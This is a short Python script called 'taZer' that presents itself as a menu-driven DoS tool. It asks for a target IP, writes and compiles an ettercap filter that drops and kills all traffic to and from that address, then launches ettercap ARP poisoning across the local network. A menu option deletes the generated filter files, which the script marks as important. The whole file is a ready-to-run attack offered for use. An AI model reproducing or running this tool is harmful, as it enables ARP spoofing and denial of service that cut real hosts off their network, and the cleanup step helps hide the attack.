#!/usr/bin/env python3

# -*- coding:utf-8 -*-

import os

iptarget = "0"

def clear():
	os.system('clear')

def banner():
	os.system('figlet taZer')

def shooting():
	os.system('ettercap -i eth0 -T -q -F dos.ef -M ARP //// ')

def setting():
	clear()
	banner()
	print("\n")
	iptarget = input('Set target IP : ')

	f = open('dos.elt', mode='wt', encoding='utf-8')
	f.write("if(ip.src=='" + iptarget + "'||ip.dst=='" + iptarget + "')\n")
	f.write('{\n')
	f.write('drop();\n')
	f.write('kill();\n')
	f.write('msg("Dos attack!");\n')
	f.write('}\n')
	f.close()
	print("Dos File Ready.")
	dosstart()

def dosstart():
	os.system('etterfilter dos.elt -o dos.ef')
	print("Complete loading.")
	firecheck = input('Want fire? (y/n) : ')

	if firecheck == 'y' :
		shooting()
	elif firecheck == 'n' :
		enter = input('Press Enter...')
		menu()
	else :
		print("Wrong input. try again.")
		menu()

def removeelf():
	os.system('rm -rf /root/taZer/dos.elt')
	os.system('rm -rf /root/taZer/dos.ef')
	print("History Files are completely deleted.")
	back = input('Press Enter...')
	menu()


def menu():
	clear()
	banner()
	print("Made by R1K3R_\n")
	print("Version 1.2 (Update!)\n")
	print("\n")
	print("1. Start DoS Attack.\n")
	print("2. Remove dos.elt & dos.ef (important)\n")
	print("3. exit.\n")
	print("\n")
	startCheck = input('Select it : ')

	if startCheck == '1' :
		setting()
	elif startCheck == '2' :
		removeelf()
	elif startCheck == '3' :
		exit = input('Press Enter...')
	else :
		print("Wrong input. try again.")
		menu()

menu()
